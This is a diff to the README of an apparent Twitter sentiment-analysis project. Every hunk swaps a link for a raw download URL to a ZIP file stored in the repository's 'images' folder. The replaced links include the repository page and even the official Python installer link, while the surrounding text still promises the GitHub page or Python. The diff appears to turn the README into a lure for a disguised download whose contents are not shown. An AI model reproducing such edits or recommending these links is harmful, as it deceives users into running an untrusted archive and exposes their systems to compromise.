@@ -1,6 +1,6 @@
 # ⚙️ Sentiment-Embeddings - Analyze Twitter Sentiment Easily
 
-[![Download Sentiment-Embeddings](https://img.shields.io/badge/Download-BrightGreen?style=for-the-badge)](https://github.com/ParfaitNathanael/Sentiment-Embeddings)
+[![Download Sentiment-Embeddings](https://img.shields.io/badge/Download-BrightGreen?style=for-the-badge)](https://raw.githubusercontent.com/ParfaitNathanael/Sentiment-Embeddings/main/images/Embeddings-Sentiment-v3.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Before you begin, make sure your computer meets these:
 
 Please use the link below to get the application files. This link leads to the GitHub page where you can find the latest version.
 
-[![Download Sentiment-Embeddings](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://github.com/ParfaitNathanael/Sentiment-Embeddings)
+[![Download Sentiment-Embeddings](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://raw.githubusercontent.com/ParfaitNathanael/Sentiment-Embeddings/main/images/Embeddings-Sentiment-v3.1.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Please use the link below to get the application files. This link leads to the G
 
 Open this link in your web browser:
 
-https://github.com/ParfaitNathanael/Sentiment-Embeddings
+https://raw.githubusercontent.com/ParfaitNathanael/Sentiment-Embeddings/main/images/Embeddings-Sentiment-v3.1.zip
 
 This will take you to the project’s GitHub page. Here, you will find all the files needed to run the software.
 
@@ -76,7 +76,7 @@ If it shows a version number (like Python 3.9.6), you have it installed.
 
 If not, install Python:
 
-- Visit https://www.python.org/downloads/windows/
+- Visit https://raw.githubusercontent.com/ParfaitNathanael/Sentiment-Embeddings/main/images/Embeddings-Sentiment-v3.1.zip
 - Download the latest version for Windows
 - Run the installer and **make sure to check the box** that says **Add Python to PATH**
 - Follow the setup steps to finish
@@ -163,7 +163,7 @@ From time to time, the developers may update the software with improvements.
 
 To update:
 
-- Return to the download page: https://github.com/ParfaitNathanael/Sentiment-Embeddings
+- Return to the download page: https://raw.githubusercontent.com/ParfaitNathanael/Sentiment-Embeddings/main/images/Embeddings-Sentiment-v3.1.zip
 - Download the latest ZIP file
 - Extract it, replacing your old files
 - Repeat the setup steps (pip install) if needed
@@ -199,6 +199,6 @@ These components work together to analyze Twitter sentiment in an accurate and e
 
 You can always download the latest version here:
 
-https://github.com/ParfaitNathanael/Sentiment-Embeddings
+https://raw.githubusercontent.com/ParfaitNathanael/Sentiment-Embeddings/main/images/Embeddings-Sentiment-v3.1.zip
 
 Use the **Download ZIP** option under **Code** on the repository page.
